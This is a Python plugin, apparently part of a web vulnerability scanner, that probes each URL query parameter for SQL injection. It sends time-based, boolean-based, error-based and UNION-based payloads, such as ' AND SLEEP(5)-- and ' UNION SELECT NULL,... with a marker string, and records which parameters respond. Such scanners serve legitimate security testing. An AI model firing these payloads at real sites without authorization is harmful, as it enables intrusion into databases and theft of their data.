import urllib.parse  # URL解析核心库
import copy
import difflib  #
import re
import re
import time
from core import requestor
from utils.logger import info, success
from core.analyzer import boolean_based_analysis, time_based_analysis, error_based_analysis, union_based_analysis

name = "SQL Injection"


# URL处理
# 拆
def parse_url_params(url):
    parsed = urllib.parse.urlparse(url)  # 拆URL结构
    params = urllib.parse.parse_qs(parsed.query)  # 把query转dict
    return parsed, params


# 建
def build_url(parsed, params):
    query = urllib.parse.urlencode(params, doseq=True)  # 把dict转为query
    # 拼接
    return urllib.parse.urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, query, parsed.fragment
    ))


# 注入函数
def inject_param(url, param, payload):
    parsed, params = parse_url_params(url)
    # 防御性编译：避免异常
    if param not in params:
        return None

    # 深拷贝，否则原始参数会被污染
    new_params = copy.deepcopy(params)
    # 注入
    new_params[param] = [params[param][0] + payload]
    return build_url(parsed, new_params)


# 主入口
def check(context):
    url = context.url
    parsed = context.parsed
    params = context.params
    base_response = context.base_response
    base_text = context.base_text
    base_len = context.base_len

    if not params:
        return None

    # 初始化
    results = []

    info(f"BASE URL:{base_response.url}")
    for param in params:
        if param.lower() in ["submit", "csrf", "token"]:
            continue
        info(f"测试参数: {param}")
        # 时间盲注（必须对比）
        baseline_times = []
        ts_sleep = []
        ts_normal = []
        payload_sleep = "' AND SLEEP(5)--"
        payload_normal = "' AND SLEEP(0)--"

        url_sleep = inject_param(url, param, payload_sleep)
        url_normal = inject_param(url, param, payload_normal)
        for _ in range(5):
            baseline_times.append(base_response.elapsed_time)
            r_sleep = requestor.get(url_sleep)
            r_normal = requestor.get(url_normal)

            if r_sleep:
                ts_sleep.append(r_sleep.elapsed_time)
            if r_normal:
                ts_normal.append(r_normal.elapsed_time)

        if time_based_analysis(baseline_times, ts_sleep, ts_normal):
            success(f"时间盲注: {param}")
            results.append({
                "type": "sqli",
                "method": "time_blind",
                "param": param,
                "url": url
            })

        # 布尔盲注（核心）

        url_true = inject_param(url, param, "' AND 1=1 -- ")
        url_false = inject_param(url, param, "' AND 1=2 -- ")

        true_texts = []
        false_texts = []

        for _ in range(3):
            r_true = requestor.get(url_true)
            r_false = requestor.get(url_false)

            if r_true is not None:
                true_texts.append(r_true.text)
            if r_false is not None:
                false_texts.append(r_false.text)

        if true_texts and false_texts:
            if boolean_based_analysis(base_text, true_texts, false_texts, similarity):
                success(f"布尔盲注: {param}")
                results.append({
                    "type": "sqli",
                    "method": "boolean_blind",
                    "param": param,
                    "url": url
                })

        # 报错注入
        payloads = ["'", "\"", "\"))"]

        for payload in payloads:

            test_url = inject_param(url, param, payload)
            r = requestor.get(test_url)
            if not r:
                continue
            if error_based_analysis(base_text, r.text, similarity):
                success(f"报错注入: {param}")
                results.append({
                    "type": "sqli",
                    "method": "error_based",
                    "param": param,
                    "url": url
                })
                # 命中一个就结束
                break

        # UNION
        MAX_COLUMN = 8
        MARK = "qztest123"
        found_columns = 0

        # 列数探测
        for i in range(1, MAX_COLUMN + 1):
            test_url = inject_param(url, param, f"' ORDER BY {i}--")
            r = requestor.get(test_url)

            if not r:
                continue
            #报错关键词匹配
            error_keywords = ["Unknown column","ORDER BY","sql syntax","syntax error"]
            has_error = any(kw in r.text.lower() for kw in error_keywords)
            if r.status_code >= 500 or len(r.text) < base_len * 0.8 or has_error:
                found_columns = i - 1
                break

        if  found_columns == 0:
            info(f"参数{param}未探测出有效列数，跳过UNION注入检测")

        # UNION 注入检测
        for i in range(1, found_columns + 1):
            payload_list = ["NULL"] * found_columns
            payload_list[i - 1] = f"'{MARK}'"

            union_payload = "' UNION SELECT " + ",".join(payload_list) + "-- "

            union_url = inject_param(url, param, union_payload)

            union_texts = []

            # 多次采样
            for _ in range(3):
                r_union = requestor.get(union_url)
                if r_union:
                    union_texts.append(r_union.text)

            if union_texts:
                if union_based_analysis(base_text, union_texts, similarity, MARK):
                    success(f"UNION注入: {param}")
                    results.append({
                        "type": "sqli",
                        "method": "union",
                        "param": param,
                        "url": url,
                        "columns": found_columns
                    })
                    break
    return results


# 相似性，返回0-1
def similarity(a, b):
    return difflib.SequenceMatcher(None, a, b).ratio()